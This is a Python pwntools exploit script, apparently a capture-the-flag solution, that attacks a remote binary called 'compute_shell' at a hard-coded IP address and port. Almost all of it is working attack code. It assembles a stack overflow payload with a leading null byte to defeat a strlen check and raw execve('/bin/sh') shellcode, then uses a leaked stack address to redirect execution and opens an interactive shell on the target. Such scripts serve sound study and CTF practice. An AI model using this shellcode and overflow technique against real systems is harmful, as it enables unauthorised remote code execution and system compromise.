#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 34.72.218.129 --port 3333
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './compute_shell'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '34.72.218.129'
port = int(args.PORT or 3333)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main+86
b *main+96
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

# start with 0 for strlen comparison, add shellcode for execve('/bin/sh')
payload = b"\x00\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05" 
payload += cyclic(44 - len(payload)) # filler
payload += p64(0x90908e69)
payload += cyclic(20)

print(io.recvuntil(b'detected:\n'))

leak_text=io.recvline()
print(leak_text[0:-1]) 
leak_addr=int(leak_text[0:-1], 0)
print(hex(leak_addr+1)) # Add 1 because of the 0 prepended
payload += p64(leak_addr+1) # address to jump to

print(len(payload))
print(io.recvuntil(b'action:'))
io.send(payload + b'\n')
io.interactive()

